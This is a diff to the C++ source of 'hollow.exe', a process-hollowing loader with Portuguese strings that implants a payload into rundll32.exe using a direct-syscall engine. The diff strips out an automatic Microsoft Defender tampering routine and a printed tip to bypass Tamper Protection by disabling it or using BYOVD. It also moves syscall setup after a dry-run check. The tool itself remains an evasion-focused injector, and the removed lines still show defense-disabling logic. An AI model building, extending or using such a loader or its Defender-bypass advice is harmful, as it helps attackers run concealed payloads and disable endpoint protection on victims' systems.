@@ -76,8 +76,8 @@ void Usage()
         "hollow.exe [opcoes]\n"
         "  --host <exe>       processo hospedeiro (default: %%WINDIR%%\\System32\\rundll32.exe)\n"
         "  --payload <exe>    imagem a ser implantada (default: payload.exe ao lado)\n"
-        "  --no-defender      nao mexe no Defender\n"
-        "  --dry-run          valida PE/dimensoes e sai sem executar\n"
+        "  --no-defender      compatibilidade (Defender nunca e alterado)\n"
+        "  --dry-run          valida payload PE sem iniciar processos nem alterar o sistema\n"
         "\n"
         "O payload precisa ter SizeOfImage <= SizeOfImage do host.\n");
 }
@@ -235,12 +235,12 @@ int main()
     const std::wstring dir = ExeDir();
     std::wstring host        = L"C:\\Windows\\System32\\rundll32.exe";
     std::wstring payloadPath = dir + L"\\payload.exe";
-    bool doDefender = true;
+
     bool dryRun     = false;
 
     for (int i = 1; i < argc; ++i) {
         std::wstring a = argv[i];
-        if (a == L"--no-defender")      doDefender = false;
+        if (a == L"--no-defender")      { /* flag legada: sem alteracoes de protecao */ }
         else if (a == L"--dry-run")     dryRun = true;
         else if (a == L"--help" || a == L"-h") { Usage(); LocalFree(argv); return 0; }
         else if (a == L"--host"    && i + 1 < argc) host = argv[++i];
@@ -263,27 +263,8 @@ int main()
            ds.serviceRunning ? "rodando" : "parado",
            ds.rtOff ? "off" : "on");
 
-    if (doDefender) {
-        if (!ds.elevated) {
-            printf("[!] sem elevacao: pular manipulacao do Defender\n");
-        } else if (ds.tamper == 1) {
-            printf("[!] Tamper Protection LIGADO: escritas no Defender serao negadas.\n"
-                   "    Desligue em Seguranca do Windows > Protecao contra violacoes,\n"
-                   "    ou va de via kernel (BYOVD) — userland nao passa daqui.\n");
-        } else {
-            printf("[*] aplicando ajustes no Defender\n");
-            ApplyDefenderTamper(dir);
-        }
-    }
-
-    // --- motor de syscall --------------------------------------------------
-    if (!SysInit()) {
-        printf("[!] falha ao inicializar o motor de syscall (gadget/SSN)\n");
-        return 1;
-    }
-    unsigned stubs = 0; void* gadget = nullptr;
-    SysStats(&stubs, &gadget);
-    printf("[*] syscalls: %u stubs | gadget=%p\n", stubs, gadget);
+    // Nunca modificar configuracoes de protecao do endpoint automaticamente.
+    // O estado consultado acima e apenas diagnostico.
 
     // --- payload -----------------------------------------------------------
     Payload pl;
@@ -296,7 +277,18 @@ int main()
            static_cast<unsigned long>(pl.entryRva),
            static_cast<unsigned>(pl.sections));
 
-    if (dryRun) { printf("[*] dry-run: nada executado\n"); return 0; }
+    if (dryRun) { printf("[*] dry-run: payload validado; nenhum processo criado ou defesa alterada\n"); return 0; }
+
+    // --- motor de syscall --------------------------------------------------
+    if (!SysInit()) {
+        printf("[!] falha ao inicializar o motor de syscall (gadget/SSN)\n");
+        return 1;
+    }
+    unsigned stubs = 0; void* gadget = nullptr;
+    SysStats(&stubs, &gadget);
+    printf("[*] syscalls: %u stubs | gadget=%p\n", stubs, gadget);
+
+
 
     // --- spawn -------------------------------------------------------------
     STARTUPINFOW si{};
